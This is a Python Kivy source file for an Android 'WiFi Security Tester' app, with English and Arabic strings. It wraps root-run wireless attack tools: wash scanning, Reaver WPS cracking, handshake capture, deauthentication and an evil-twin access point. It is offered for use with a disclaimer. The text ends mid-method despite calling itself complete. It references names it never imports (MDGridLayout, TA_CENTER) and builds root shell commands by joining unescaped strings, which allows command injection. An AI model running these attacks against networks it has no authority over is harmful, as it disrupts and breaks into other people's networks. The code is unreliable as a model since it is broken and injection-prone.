# ==============================================================================
#      WiFi Security Tester - Final Complete and Corrected Version 9.0
#              Developed by: Ahmed Mustafa Ibrahim (GOGOM8870@GMAIL.COM)
# ==============================================================================
#
# هذا الملف هو النسخة النهائية والمصححة بالكامل لتطبيق اختبار أمان الواي فاي.
# يشمل جميع الميزات المطلوبة، مع تصحيح الأخطاء البرمجية والمنطقية.
#
# ==============================================================================

import os
import sys
import subprocess
import threading
import json
import time
from datetime import datetime
from functools import partial

# --- Kivy, KivyMD & Garden Imports ---
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.properties import StringProperty, ListProperty, DictProperty, NumericProperty, ObjectProperty
from kivy.clock import Clock
from kivy.utils import platform, get_color_from_hex
from kivy.core.window import Window
from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel, MDIcon
from kivymd.uix.button import MDRaisedButton, MDFloatingActionButton, MDIconButton, MDFlatButton
from kivymd.uix.card import MDCard
from kivymd.uix.list import MDList, TwoLineAvatarIconListItem, IconLeftWidget, ThreeLineAvatarIconListItem
from kivymd.uix.toolbar import MDTopAppBar
from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationItem
from kivymd.uix.textfield import MDTextField
from kivymd.uix.spinner import MDSpinner
from kivymd.uix.snackbar import Snackbar
from kivymd.uix.dialog import MDDialog
from kivymd.uix.tab import MDTabs, MDTabsBase
from kivymd.uix.floatlayout import MDFloatLayout
from kivy_garden.graph import Graph, MeshLinePlot

# --- Plyer for File Chooser ---
try:
    from plyer import filechooser
except ImportError:
    filechooser = None # Placeholder if plyer is not installed

# --- JNIus for Android Specific APIs ---
if platform == 'android':
    try:
        from jnius import autoclass
        from android.permissions import request_permissions, Permission
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        Context = autoclass('android.content.Context')
    except ImportError:
        autoclass, activity, Context = None, None, None
else:
    autoclass, activity, Context = None, None, None

# --- ReportLab for PDF Reports ---
try:
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
except ImportError:
    # Define dummy classes/functions if reportlab is not available
    class SimpleDocTemplate:
        def __init__(self, filename): pass
        def build(self, story): pass
    class Paragraph:
        def __init__(self, text, style): pass
    class Spacer:
        def __init__(self, width, height): pass
    def getSampleStyleSheet():
        class Styles:
            def __getitem__(self, key): return None
            def add(self, style): pass
        return Styles()
    ParagraphStyle = object


# ==============================================================================
# 1. Localization & Translation System
# ==============================================================================
LANGUAGES = {
    "en": {
        "app_title": "WiFi Security Tester",
        "home": "Home", "discovery": "Discovery", "exploitation": "Exploitation", "tools": "Tools", "settings": "Settings", "about": "About",
        "status": "System Status", "root_access": "Root Access", "network_status": "Network Status", "quick_actions": "Quick Actions",
        "scan_networks": "Scan Networks", "checking": "Checking...", "granted": "Granted", "denied": "Denied", "connected_to": "Connected to: {}",
        "disconnected": "Disconnected", "wifi_disabled": "WiFi is disabled.", "start_full_scan": "Start Full Scan",
        "found_networks": "Found {} networks. Analyzing...", "no_networks": "No networks found or permissions denied.",
        "all_networks": "All", "wps_enabled": "WPS Enabled", "wpa_wpa2": "WPA/WPA2", "open_networks": "Open",
        "monitor_mode_control": "Monitor Mode Control", "original_interface": "Original Interface (e.g., wlan0)",
        "start_monitor_mode": "Start Monitor", "stop_monitor_mode": "Stop Monitor",
        "wps_attacks": "WPS Attacks", "wpa_attacks": "WPA/WPA2 Attacks", "deauth_attack": "Deauthentication Attack",
        "scan_for_wps": "Scan (wash)", "start_reaver": "Reaver Attack (Pixie-Dust)", "capture_handshake": "Capture Handshake",
        "start_aircrack_attack": "Dictionary Attack (Aircrack-ng)", "start_evil_twin": "Start Evil Twin (airbase-ng)",
        "target_bssid": "Target BSSID", "target_channel": "Target Channel", "monitor_interface": "Monitor Interface",
        "output_file_prefix": "Output File Prefix", "handshake_cap_file": "Handshake File (.cap)", "wordlist_file_path": "Wordlist Path",
        "choose_wordlist": "Choose Wordlist", "stop_all_attacks": "Stop All Attacks", "report_generated": "Report generated: {}", "report_failed": "Failed to generate report: {}",
        "export_pdf_report": "Export PDF Report", "language": "Language", "theme": "Theme", "dark_mode": "Dark Mode",
        "light_mode": "Light Mode", "check_tool_status": "Check Tool Status", "tool_ready": "Ready", "tool_missing": "Missing or not executable",
        "attack_options_for": "Attack Options for {}", "vulnerabilities": "Vulnerabilities: {}", "about_title": "About WiFi Security Tester", "version": "Version", "developer": "Developer",
        "contact": "Contact", "phone": "Phone", "email": "Email", "disclaimer": "Disclaimer",
        "disclaimer_text": "This application is intended for educational and security testing purposes only on networks you own or have explicit permission to test. Unauthorized use is illegal. The developer is not responsible for any misuse.",
        "signal_dbm": "Signal (dBm)", "network": "Network", "current_active_attacks": "Currently Active Attacks",
        "target_client": "Target Client (optional, FF:..:FF)", "ssid_to_clone": "SSID to Clone",
        "bssid_iface_required": "BSSID and Interface are required.", "all_handshake_fields_required": "All handshake fields are required.",
        "cap_wordlist_required": "Handshake file and Wordlist are required.", "wordlist_not_found": "Wordlist file not found.",
        "handshake_not_found": "Handshake capture file not found.", "ssid_iface_required": "SSID and Interface are required."
    },
    "ar": {
        "app_title": "مختبر أمان الواي فاي",
        "home": "الرئيسية", "discovery": "الاكتشاف", "exploitation": "الاستغلال", "tools": "الأدوات", "settings": "الإعدادات", "about": "حول",
        "status": "حالة النظام", "root_access": "صلاحيات الروت", "network_status": "حالة الشبكة", "quick_actions": "إجراءات سريعة",
        "scan_networks": "فحص الشبكات", "checking": "جاري التحقق...", "granted": "ممنوح", "denied": "مرفوض", "connected_to": "متصل بـ: {}",
        "disconnected": "غير متصل", "wifi_disabled": "الواي فاي معطل.", "start_full_scan": "ابدأ الفحص الكامل",
        "found_networks": "تم العثور على {} شبكة. جاري التحليل...", "no_networks": "لم يتم العثور على شبكات أو تم رفض الأذونات.",
        "all_networks": "الكل", "wps_enabled": "WPS مفعّل", "wpa_wpa2": "WPA/WPA2", "open_networks": "مفتوحة",
        "monitor_mode_control": "التحكم في وضع المراقبة", "original_interface": "الواجهة الأصلية (مثال: wlan0)",
        "start_monitor_mode": "بدء المراقبة", "stop_monitor_mode": "إيقاف المراقبة",
        "wps_attacks": "هجمات WPS", "wpa_attacks": "هجمات WPA/WPA2", "deauth_attack": "هجوم قطع الاتصال",
        "scan_for_wps": "فحص (wash)", "start_reaver": "هجوم Reaver (Pixie-Dust)", "capture_handshake": "التقاط المصافحة",
        "start_aircrack_attack": "هجوم القاموس (Aircrack-ng)", "start_evil_twin": "بدء التوأم الشرير (airbase-ng)",
        "target_bssid": "BSSID الهدف", "target_channel": "قناة الهدف", "monitor_interface": "واجهة المراقبة",
        "output_file_prefix": "اسم ملف الإخراج", "handshake_cap_file": "ملف المصافحة (.cap)", "wordlist_file_path": "مسار قائمة الكلمات",
        "choose_wordlist": "اختر قائمة الكلمات", "stop_all_attacks": "إيقاف كل الهجمات", "report_generated": "تم إنشاء التقرير: {}", "report_failed": "فشل إنشاء التقرير: {}",
        "export_pdf_report": "تصدير تقرير PDF", "language": "اللغة", "theme": "المظهر", "dark_mode": "الوضع الداكن",
        "light_mode": "الوضع الفاتح", "check_tool_status": "فحص حالة الأدوات", "tool_ready": "جاهزة", "tool_missing": "مفقودة أو غير قابلة للتنفيذ",
        "attack_options_for": "خيارات الهجوم على {}", "vulnerabilities": "الثغرات: {}", "about_title": "حول مختبر أمان الواي فاي", "version": "الإصدار", "developer": "المطور",
        "contact": "للتواصل", "phone": "الهاتف", "email": "البريد الإلكتروني", "disclaimer": "إخلاء مسؤولية",
        "disclaimer_text": "هذا التطبيق مخصص للأغراض التعليمية واختبار الأمان فقط على الشبكات التي تملكها أو لديك إذن صريح لاختبارها. الاستخدام غير المصرح به غير قانوني. المطور غير مسؤول عن أي سوء استخدام.",
        "signal_dbm": "الإشارة (dBm)", "network": "الشبكة", "current_active_attacks": "الهجمات النشطة الحالية",
        "target_client": "العميل الهدف (اختياري، FF:..:FF)", "ssid_to_clone": "SSID للاستنساخ",
        "bssid_iface_required": "حقل BSSID والواجهة مطلوبان.", "all_handshake_fields_required": "جميع حقول المصافحة مطلوبة.",
        "cap_wordlist_required": "ملف المصافحة وقائمة الكلمات مطلوبان.", "wordlist_not_found": "ملف قائمة الكلمات غير موجود.",
        "handshake_not_found": "ملف المصافحة غير موجود.", "ssid_iface_required": "حقل SSID والواجهة مطلوبان."
    }
}

class Translator:
    def __init__(self, language="en"): self.set_language(language)
    def set_language(self, language): self.language, self.translations = language, LANGUAGES.get(language, LANGUAGES["en"])
    def get(self, key): return self.translations.get(key, key)
tr = Translator()

# ==============================================================================
# 2. Managers & Helpers
# ==============================================================================

class LogPanel(ScrollView):
    """Kivy widget to display logs."""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.log_label = MDLabel(
            text="",
            adaptive_height=True,
            markup=True,
            font_style="Code",
            theme_text_color="Custom"
        )
        self.add_widget(self.log_label)
    
    def update_log(self, log_entry):
        # Colorize log entries for better readability
        if "Error" in log_entry or "Denied" in log_entry or "failed" in log_entry:
            color = "F44336" # Red
        elif "Success" in log_entry or "Granted" in log_entry or "finished" in log_entry:
            color = "4CAF50" # Green
        elif "Warning" in log_entry or "Starting" in log_entry:
            color = "FFC107" # Yellow
        else:
            color = "A9B7C6" # Default log color (light grey/blue)
        
        self.log_label.text += f"[color=#{color}]{log_entry}[/color]\n"
        self.scroll_y = 0 # Auto-scroll to bottom

class LogManager:
    """Manages logging to a file and a UI widget."""
    def __init__(self, log_widget_instance): # Accept the widget instance
        self.log_widget = log_widget_instance # Store the actual LogPanel instance
        self.log_file = os.path.join(App.get_running_app().user_data_dir, "app_log.txt")
        self.add_log(tr.get("app_title") + " LogManager initialized.")

    def add_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(f"LOG: {log_entry}")  # For console debugging
        # Update UI widget
        Clock.schedule_once(lambda dt: self.log_widget.update_log(log_entry))
        # Append to file
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')

def check_root():
    """Checks for root access by running 'su -c id'."""
    if platform != 'android':
        return True, tr.get("granted") # Assume rooted on desktop for development
    try:
        process = subprocess.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
        if process.returncode == 0 and 'uid=0(root)' in process.stdout:
            return True, tr.get("granted")
        else:
            return False, tr.get("denied")
    except Exception as e:
        return False, tr.get("denied") + f": {e}"

class ToolExecutor:
    """Executes external tools with or without root, asynchronously."""
    def __init__(self, log_manager, app_data_dir):
        self.log_manager = log_manager
        self.app_data_dir = app_data_dir
        self.tools_path = os.path.join(app_data_dir, 'tools') # Path where tools are extracted
        self.active_processes = {} # To keep track of running processes by key

    def execute(self, command_list, requires_root=False, callback=None, process_key=None):
        if process_key and process_key in self.active_processes and self.active_processes[process_key].poll() is None:
            self.log_manager.add_log(f"Process '{process_key}' is already running."); return

        def run_in_thread():
            try:
                tool_name = command_list[0]
                tool_path = os.path.join(self.tools_path, tool_name)

                if not os.path.exists(tool_path):
                    err_msg = f"Error: Tool '{tool_name}' not found at {tool_path}"
                    self.log_manager.add_log(err_msg)
                    if callback: Clock.schedule_once(lambda dt: callback(err_msg, True))
                    return

                # Build the final command to execute
                final_command = [tool_path] + command_list[1:]

                if requires_root:
                    # Pass the full path to the tools directory to the root shell's PATH
                    su_command = ['su', '-c', f"PATH=$PATH:{self.tools_path} {' '.join(final_command)}"]
                else:
                    su_command = final_command

                self.log_manager.add_log(f"Executing: {' '.join(su_command)}")
                
                # Start the subprocess, capturing stdout and stderr
                process = subprocess.Popen(
                    su_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, # Merge stderr into stdout for easier logging
                    text=True, # Decode as text
                    bufsize=1, # Line-buffered output
                    encoding='utf-8', # Explicitly set encoding
                    errors='replace' # Replace characters that can't be decoded
                )
                
                # Store the process object if a key is provided
                if process_key: self.active_processes[process_key] = process

                # Stream output line by line
                for line in iter(process.stdout.readline, ''):
                    if callback: Clock.schedule_once(lambda dt, l=line.strip(): callback(l, False))
                
                process.stdout.close() # Close stdout pipe
                return_code = process.wait() # Wait for process to finish

                # Remove process from active list
                if process_key and process_key in self.active_processes:
                    del self.active_processes[process_key]

                # Final callback with status
                if callback:
                    if return_code != 0:
                        Clock.schedule_once(lambda dt: callback(f"Process '{command_list[0]}' finished with exit code {return_code}.", True))
                    else:
                        Clock.schedule_once(lambda dt: callback(f"Process '{command_list[0]}' finished successfully.", False))

            except Exception as e:
                error_msg = f"Execution failed: {e}"
                self.log_manager.add_log(error_msg)
                if callback: Clock.schedule_once(lambda dt: callback(error_msg, True))
        
        thread = threading.Thread(target=run_in_thread)
        thread.daemon = True # Allow the thread to exit with the main program
        thread.start()

    def stop_all(self):
        """Stops all currently tracked active processes."""
        self.log_manager.add_log(tr.get("stop_all_attacks"))
        for key in list(self.active_processes.keys()): # Iterate over a copy of keys
            self.stop_process(key)

    def stop_process(self, process_key):
        """Stops a specific process by its key."""
        if process_key in self.active_processes:
            process = self.active_processes[process_key]
            self.log_manager.add_log(f"Stopping process '{process_key}' (PID: {process.pid})...")
            try:
                # Use busybox kill -9 (force kill) for reliability
                kill_cmd = [os.path.join(self.tools_path, 'busybox'), 'kill', '-9', str(process.pid)]
                subprocess.run(['su', '-c', ' '.join(kill_cmd)], timeout=5) # Add timeout
                self.log_manager.add_log(f"Process '{process_key}' killed successfully.")
            except Exception as e:
                self.log_manager.add_log(f"Error stopping process {process_key}: {e}")
            finally:
                if process_key in self.active_processes: # Ensure it's removed
                    del self.active_processes[process_key]
        else:
            self.log_manager.add_log(f"No active process with key '{process_key}' to stop.")

class WifiScanner:
    """Handles non-root WiFi scanning using Android APIs."""
    def __init__(self, log_manager):
        self.log_manager = log_manager
        if platform == 'android' and activity: self.wifi_manager = activity.getSystemService(Context.WIFI_SERVICE)
        else: self.wifi_manager = None
    
    def start_scan(self, callback):
        if not self.wifi_manager:
            self.log_manager.add_log("WiFi Manager not available for API scan (non-Android or error)."); callback([]); return
        
        # Request location permissions (required for WiFi scanning on Android 6+)
        required_perms = [Permission.ACCESS_FINE_LOCATION, Permission.ACCESS_COARSE_LOCATION]
        request_permissions(required_perms, partial(self._on_permissions_result, callback))
        
    def _on_permissions_result(self, callback, permissions, grants):
        if all(grants):
            self.log_manager.add_log("Location permissions for WiFi scan granted.")
            # Request a new scan, results will come via BroadcastReceiver (which we don't explicitly handle here, but Buildozer's framework does)
            success = self.wifi_manager.startScan()
            if success:
                self.log_manager.add_log("WiFi scan initiated. Waiting for results (4s)...")
                # Schedule to get results after a short delay (for scan to complete)
                Clock.schedule_once(lambda dt: callback(self.wifi_manager.getScanResults()), 4)
            else:
                self.log_manager.add_log("Failed to initiate WiFi scan. Using cached results if any.")
                # Return cached results if startScan() returns false (e.g., due to throttling)
                callback(self.wifi_manager.getScanResults())
        else:
            self.log_manager.add_log("Location permissions denied. Cannot perform WiFi scan."); callback([])

class NetworkAnalyzer:
    """Analyzes WiFi scan results for security weaknesses."""
    def analyze(self, scan_results_raw):
        """
        Analyzes a list of Android Wifi ScanResult objects for security weaknesses.
        :param scan_results_raw: List of Jnius WifiManager.ScanResult objects.
        :return: List of dictionaries, each describing a network's security and vulnerabilities.
        """
        analyzed_networks = []
        if not scan_results_raw: return []
        
        for r in scan_results_raw:
            ssid = r.SSID if r.SSID and r.SSID != '<hidden ssid>' else "<Hidden SSID>"
            bssid = r.BSSID
            capabilities = r.capabilities # e.g., "[WPA2-PSK-CCMP][RSN-PSK-CCMP][ESS]"
            level = r.level # RSSI value, usually negative
            
            # Determine security and vulnerabilities
            vulnerabilities = []
            if "WPA" not in capabilities and "WEP" not in capabilities:
                vulnerabilities.append("Open")
            if "WEP" in capabilities:
                vulnerabilities.append("WEP")
            if "[WPS]" in capabilities:
                vulnerabilities.append("WPS")
            
            # General security description based on highest vulnerability
            if "Open" in vulnerabilities:
                security_icon = "lock-open-variant"
                security_color = "F44336" # Red
                security_text = tr.get("open_networks")
            elif "WEP" in vulnerabilities:
                security_icon = "lock-alert"
                security_color = "FFC107" # Orange
                security_text = tr.get("wpa_wpa2") # Placeholder for WEP, but often listed as WPA/WPA2 on basic scan
            elif "WPS" in vulnerabilities:
                security_icon = "key-wireless"
                security_color = "00A2FF" # Blue/Accent
                security_text = tr.get("wps_enabled")
            else:
                security_icon = "lock"
                security_color = "4CAF50" # Green
                security_text = tr.get("wpa_wpa2") # Safe for WPA2/WPA3

            analyzed_networks.append({
                'ssid': ssid,
                'bssid': bssid,
                'signal': level,
                'capabilities': capabilities,
                'vulnerabilities': vulnerabilities,
                'security_icon': security_icon,
                'security_color': security_color,
                'security_text': security_text,
                'channel': "N/A", # API scan doesn't provide channel easily
                'wps_locked': "N/A" # API scan doesn't provide WPS locked status
            })
        return analyzed_networks

class ReportGenerator:
    def __init__(self, log_manager, app_data_dir):
        self.log_manager = log_manager
        self.app_data_dir = app_data_dir
        self.styles = getSampleStyleSheet()
        if self.styles:
            self.styles.add(ParagraphStyle(name='Center', alignment=TA_CENTER))
            self.styles.add(ParagraphStyle(name='Left', alignment=TA_LEFT))

    def generate_pdf(self, scan_results, system_info):
        if not self.styles:
            self.log_manager.add_log("Error: reportlab is not installed. Cannot generate PDF."); return None
        
        report_path = os.path.join(self.app_data_dir, f"WiFi_Security_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
        doc = SimpleDocTemplate(report_path)
        story = []

        # --- Report Header ---
        story.append(Paragraph(tr.get("app_title"), self.styles['h1']))
        story.append(Paragraph(f"Analysis Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", self.styles['Normal']))
        story.append(Spacer(1, 0.2*inch))

        # --- System Info ---
        story.append(Paragraph(tr.get("status"), self.styles['h2']))
        for key, value in system_info.items():
            story.append(Paragraph(f"<b>{key}:</b> {value}", self.styles['Normal']))
        story.append(Spacer(1, 0.2*inch))

        # --- Scan Results ---
        story.append(Paragraph(tr.get("discovery"), self.styles['h2']))
        if not scan_results:
            story.append(Paragraph("No networks were scanned or found.", self.styles['Normal']))
        else:
            for net in scan_results:
                story.append(Paragraph(f"<b>SSID:</b> {net.get('ssid', 'N/A')}", self.styles['h3']))
                story.append(Paragraph(f"<b>BSSID:</b> {net.get('bssid', 'N/A')}", self.styles['Normal']))
                story.append(Paragraph(f"<b>Signal:</b> {net.get('signal', 'N/A')} dBm", self.styles['Normal']))
                story.append(Paragraph(f"<b>Channel:</b> {net.get('channel', 'N/A')}", self.styles['Normal']))
                story.append(Paragraph(f"<b>Vulnerabilities:</b> {', '.join(net.get('vulnerabilities', []))}", self.styles['Normal']))
                if net.get('wps_locked', 'N/A') != 'N/A':
                    story.append(Paragraph(f"<b>WPS Locked:</b> {net['wps_locked']}", self.styles['Normal']))
                story.append(Spacer(1, 0.1*inch))
        
        try:
            doc.build(story)
            self.log_manager.add_log(tr.get("report_generated").format(report_path))
            return report_path
        except Exception as e:
            self.log_manager.add_log(tr.get("report_failed").format(e))
            return None


# ==============================================================================
# 3. UI Widgets & Screens
# ==============================================================================

class BaseScreen(MDScreen):
    """A base screen class to handle language updates."""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.app = MDApp.get_running_app()
        self.app.bind(language=self.update_language)
    
    def update_language(self, *args):
        # This method should be implemented by child screens
        pass

class HomeScreen(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()
    
    def build_ui(self):
        layout = MDBoxLayout(orientation='vertical', padding="20dp", spacing="20dp")
        
        # Status Card
        status_card = MDCard(padding="15dp", elevation=2, radius=[15,])
        status_box = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="10dp")
        
        self.status_title = MDLabel(font_style="H6", adaptive_height=True)
        
        root_status_layout = MDBoxLayout(adaptive_height=True)
        root_status_layout.add_widget(MDIcon(icon="cellphone-key", theme_text_color="Primary"))
        self.root_access_label = MDLabel(adaptive_height=True)
        self.root_label = MDLabel(adaptive_height=True)
        root_status_layout.add_widget(self.root_access_label)
        root_status_layout.add_widget(self.root_label)
        
        net_status_layout = MDBoxLayout(adaptive_height=True)
        net_status_layout.add_widget(MDIcon(icon="wifi", theme_text_color="Primary"))
        self.net_status_label_title = MDLabel(adaptive_height=True)
        self.net_label = MDLabel(adaptive_height=True)
        net_status_layout.add_widget(self.net_status_label_title)
        net_status_layout.add_widget(self.net_label)
        
        status_box.add_widget(self.status_title)
        status_box.add_widget(root_status_layout)
        status_box.add_widget(net_status_layout)
        status_card.add_widget(status_box)

        # Quick Actions Card
        actions_card = MDCard(padding="15dp", elevation=2, radius=[15,])
        actions_box = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="10dp")
        self.actions_title = MDLabel(font_style="H6", adaptive_height=True)
        
        btn_layout = MDGridLayout(cols=2, spacing="10dp", adaptive_height=True)
        self.scan_btn = MDRaisedButton(on_release=lambda x: self.app.change_screen('discovery'))
        self.exploit_btn = MDRaisedButton(on_release=lambda x: self.app.change_screen('exploitation'))
        btn_layout.add_widget(self.scan_btn)
        btn_layout.add_widget(self.exploit_btn)
        actions_box.add_widget(self.actions_title)
        actions_box.add_widget(btn_layout)
        actions_card.add_widget(actions_box)

        layout.add_widget(status_card)
        layout.add_widget(actions_card)
        layout.add_widget(BoxLayout()) # Spacer
        
        self.add_widget(layout)
        self.update_language()

    def on_enter(self, *args):
        self.update_status()
    
    def update_status(self):
        is_rooted, msg = check_root()
        self.root_label.text = tr.get(msg.lower()) if msg.lower() in tr.translations else msg
        
        if platform == 'android' and activity:
            wm = activity.getSystemService(Context.WIFI_SERVICE)
            if wm and wm.isWifiEnabled():
                info = wm.getConnectionInfo()
                if info and info.getSSID():
                    self.net_label.text = tr.get("connected_to").format(info.getSSID())
                else:
                    self.net_label.text = tr.get("disconnected")
            else:
                self.net_label.text = tr.get("wifi_disabled")

    def update_language(self, *args):
        self.status_title.text = tr.get("status")
        self.root_access_label.text = tr.get("root_access")
        self.net_status_label_title.text = tr.get("network_status")
        self.actions_title.text = tr.get("quick_actions")
        self.scan_btn.text = tr.get("discovery")
        self.exploit_btn.text = tr.get("exploitation")
        self.update_status() # Update status text with new language

class DiscoveryScreen(BaseScreen):
    """
    صفحة الاكتشاف الموحدة: تجمع نتائج الفحص من مصادر متعددة.
    """
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.scan_results = {} # Store results by BSSID to avoid duplicates and update info
        self.attack_dialog = None # Keep track of the active dialog

        layout = MDFloatLayout()
        
        self.tabs = MDTabs(pos_hint={'center_x': 0.5, 'top': 1}, size_hint_y=0.9, tab_bar_height="48dp")
        self.tabs.bind(on_tab_switch=self.on_tab_switch) # Not used directly for logic, but good practice
        
        layout.add_widget(self.tabs)
        
        self.spinner = MDSpinner(active=False, size_hint=(None, None), size=("46dp", "46dp"), pos_hint={'center_x': .5, 'center_y': .5})
        layout.add_widget(self.spinner)

        scan_button = MDFloatingActionButton(
            icon="radar",
            pos_hint={'center_x': 0.9, 'center_y': 0.1},
            on_release=self.start_full_scan
        )
        layout.add_widget(scan_button)
        
        self.add_widget(layout)
        self.update_language()

    def start_full_scan(self, instance):
        self.spinner.active = True
        self.scan_results = {} # Clear previous results
        self.tabs.clear_widgets() # Clear old tabs and contents
        
        self.app.log_manager.add_log(tr.get("start_full_scan"))
        # Chain the scans: first API, then wash
        self.app.wifi_scanner.start_scan(self.process_api_scan_results)

    def process_api_scan_results(self, api_results_raw):
        self.app.log_manager.add_log("API scan finished. Processing results...")
        api_analyzed_results = self.app.network_analyzer.analyze(api_results_raw)
        
        for net in api_analyzed_results:
            self.scan_results[net['bssid']] = net # Store by BSSID

        # After API scan, start wash if rooted
        is_rooted, _ = check_root()
        if is_rooted:
            self.app.log_manager.add_log("Starting 'wash' scan for WPS details...")
            monitor_iface = self.app.sm.get_screen('exploitation').monitor_iface.text.strip() # Get current monitor interface
            if not monitor_iface or monitor_iface == "wlan0":
                self.app.log_manager.add_log("Warning: Monitor interface not set or not in monitor mode. Skipping wash scan.")
                self.spinner.active = False
                self.populate_tabs() # Populate with only API results
                return

            command = ['wash', '-i', monitor_iface]
            # Use partial to pass extra arguments to the callback
            self.app.tool_executor.execute(
                command, 
                requires_root=True, 
                callback=self.process_wash_output,
                process_key='wash_scan'
            )
        else:
            self.app.log_manager.add_log("Device not rooted. Skipping 'wash' scan.")
            self.spinner.active = False
            self.populate_tabs() # Populate with only API results

    def process_wash_output(self, line, is_error):
        if is_error and "finished" not in line: # Only log errors, not completion message
            self.app.log_manager.add_log(f"Wash scan error: {line}")
        elif "BSSID" not in line and "----" not in line and line.strip(): # Skip header/footer
            parts = [p.strip() for p in line.split()]
            if len(parts) >= 6: # Basic check for valid line structure
                bssid, channel, rssi, wps_version, wps_locked, essid_parts = parts[0], parts[1], parts[2], parts[3], parts[4], parts[5:]
                essid = " ".join(essid_parts)
                
                # Update existing entry or add new one
                if bssid in self.scan_results:
                    net_info = self.scan_results[bssid]
                    net_info['channel'] = channel
                    net_info['wps_locked'] = wps_locked
                    if "WPS" not in net_info['vulnerabilities']:
                        net_info['vulnerabilities'].append("WPS") # Ensure WPS is listed if wash found it
                    net_info['security_icon'] = "key-wireless" # Stronger WPS icon
                    net_info['security_text'] = tr.get("wps_enabled") # Update security text
                else:
                    # Add new entry if wash finds a network API scan missed
                    self.scan_results[bssid] = {
                        'ssid': essid, 'bssid': bssid, 'signal': int(rssi),
                        'capabilities': "[WPS]", 'vulnerabilities': ["WPS"],
                        'security_icon': "key-wireless", 'security_color': "00A2FF", 'security_text': tr.get("wps_enabled"),
                        'channel': channel, 'wps_locked': wps_locked
                    }
        
        if "finished" in line: # End of wash scan
            self.spinner.active = False
            self.app.log_manager.add_log(f"Full discovery finished. Found {len(self.scan_results)} networks. Populating UI.")
            self.populate_tabs()
            self.app.on_discovery_results(list(self.scan_results.values())) # Send results to app for PDF

    def populate_tabs(self):
        self.tabs.clear_widgets()
        
        all_nets = list(self.scan_results.values())
        # Filter into categories
        wps_nets = [n for n in all_nets if "WPS" in n['vulnerabilities']]
        wpa_nets = [n for n in all_nets if "WPA" in str(n.get('capabilities', ''))] # Check 'WPA' in capabilities string
        open_nets = [n for n in all_nets if "Open" in n['vulnerabilities']]

        # Sort for consistent display
        all_nets.sort(key=lambda x: x['signal'], reverse=True)
        wps_nets.sort(key=lambda x: x['signal'], reverse=True)
        wpa_nets.sort(key=lambda x: x['signal'], reverse=True)
        open_nets.sort(key=lambda x: x['signal'], reverse=True)


        categories = {
            "all": {"title": tr.get("all_networks"), "icon": "wifi", "data": all_nets},
            "wps": {"title": tr.get("wps_enabled"), "icon": "key-wireless", "data": wps_nets},
            "wpa": {"title": tr.get("wpa_wpa2"), "icon": "shield-lock", "data": wpa_nets},
            "open": {"title": tr.get("open_networks"), "icon": "lock-open-variant", "data": open_nets},
        }

        for cat_key, cat_info in categories.items():
            tab_item = MDTabsBase(title=cat_info['title'])
            
            scroll = ScrollView()
            content_list = MDList()
            
            for net in cat_info['data']:
                vuln_str = ", ".join(net['vulnerabilities']) if net['vulnerabilities'] else "None"
                item = ThreeLineAvatarIconListItem(
                    text=f"{net['ssid']}",
                    secondary_text=f"BSSID: {net['bssid']} | Signal: {net['signal']} dBm | CH: {net.get('channel', 'N/A')}",
                    tertiary_text=tr.get("vulnerabilities").format(vuln_str),
                    on_release=partial(self.show_attack_dialog, net)
                )
                item.add_widget(IconLeftWidget(icon=net['security_icon'], theme_text_color="Custom", text_color=get_color_from_hex(net['security_color'])))
                content_list.add_widget(item)
            
            scroll.add_widget(content_list)
            tab_item.add_widget(scroll)
            self.tabs.add_widget(tab_item)

    def on_tab_switch(self, instance_tabs, instance_tab, instance_tab_label, tab_text):
        pass # Currently no specific logic needed here

    def show_attack_dialog(self, net_info, instance_list_item): # instance_list_item is the button
        if self.attack_dialog: return # Dialog already open
        
        attack_buttons_layout = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        
        # Add basic info to the dialog
        attack_buttons_layout.add_widget(MDLabel(text=f"[b]{net_info['ssid']}[/b]", font_style="H6", halign="center", markup=True))
        attack_buttons_layout.add_widget(MDLabel(text=f"BSSID: {net_info['bssid']}", font_style="Body1", halign="center"))
        
        # Determine available attacks based on vulnerabilities
        if "WPS" in net_info['vulnerabilities']:
            attack_buttons_layout.add_widget(MDRaisedButton(text=tr.get("start_reaver"), on_release=lambda x: self.start_attack_from_dialog('reaver', net_info)))
        
        # Handshake capture (for WPA/WPA2 networks)
        if "WPA" in str(net_info.get('capabilities', '')):
            attack_buttons_layout.add_widget(MDRaisedButton(text=tr.get("capture_handshake"), on_release=lambda x: self.start_attack_from_dialog('airodump', net_info)))
        
        # Deauthentication attack (universal, but requires monitor mode)
        attack_buttons_layout.add_widget(MDRaisedButton(text=tr.get("deauth_attack"), on_release=lambda x: self.start_attack_from_dialog('deauth', net_info)))
        
        # Evil Twin (airbase-ng)
        attack_buttons_layout.add_widget(MDRaisedButton(text=tr.get("start_evil_twin"), on_release=lambda x: self.start_attack_from_dialog('eviltwin', net_info)))

        # Create the dialog
        self.attack_dialog = MDDialog(
            title=tr.get("attack_options_for").format(net_info['ssid']),
            type="custom",
            content_cls=attack_buttons_layout,
            buttons=[
                MDFlatButton(text="CANCEL", on_release=lambda x: self.attack_dialog.dismiss()),
            ],
            auto_dismiss=False # Prevent dismiss when clicking outside
        )
        self.attack_dialog.bind(on_dismiss=lambda *args: setattr(self, 'attack_dialog', None))
